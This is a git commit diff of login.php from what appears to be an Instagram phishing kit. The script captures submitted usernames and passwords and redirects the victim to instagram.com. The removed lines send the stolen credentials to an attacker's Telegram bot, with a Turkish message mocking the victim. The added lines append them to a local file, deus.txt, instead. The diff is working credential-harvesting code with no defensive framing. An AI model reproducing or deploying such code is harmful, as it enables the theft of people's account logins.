7159d173ad2ecfd0ab3b9ecf5d2f02dfac33c54e
sublimedeus <108197268+sublimedeus@users.noreply.github.com>
2022-06-27 13:38:11 +0300

    Add files via upload

--- login.php
+++ login.php
@@ -1,21 +1,13 @@
 <?php
-include('tg.php');
  $user = $_POST["username"];
  $pass = $_POST["password"];
 
+ $co = "===========================================\n"; 
+ $cl = "===========================================\n";
+ $fileuser = fopen("deus.txt", "a") or die("Intentalo nuevamente");
  $us = "Username: $user\n";
  $pa = "Password: $pass\n";
-
-
-$data = [
-  'text' => '➡️ Lan Koş Sazan Düştü 😈 
-Kullanıcı Adı : '.$us.'
-Şifre : '.$pass.'
-',
-  'chat_id' => $chat_id
-];
-
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
+ fwrite($fileuser, "\n". $co. $us. $pa. $cl);
+ fclose($fileuser);
  header('Location: https://instagram.com/');
  exit()
-
